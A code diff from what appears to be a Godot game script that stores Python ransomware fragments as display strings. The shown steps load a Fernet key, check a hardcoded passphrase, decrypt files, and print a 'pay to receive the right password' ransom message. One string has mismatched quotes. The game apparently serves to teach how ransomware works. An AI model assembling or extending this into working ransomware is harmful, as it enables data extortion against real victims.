@@ -20,10 +20,8 @@ var ransomware_code = {
 	"step_4": "with open('key.key', 'rb') as key:\n\t\tpassword = key.read()\n",
 	"step_5": "passphrase = 'WhiteHat'\nuserpass = input('Enter the password you received from us:')\n\n",
 	"step_6": "if userpass == passphrase:\n\tfor file in allfiles:\n\t\twith open(file, \'rb\') as thefile:\n\t\t\t contents = thefile.read()\n\t\tcontent_decr = Fernet(password).decrypt(contents)\n\t\twith open(file, \"wb\") as thefile:\n \t\t\tthefile.write(content_decr)\n\t\tprint(\"You got your files back\')\nelse:\n \tprint('Wrong password! Pay to receive the right password')",
-	
 }
 func _ready() -> void:
-	UiManager.nav_buttons_active = true
 	back_button.disabled = true
 	code_edit.text = ""
 	overlay.visible = false 
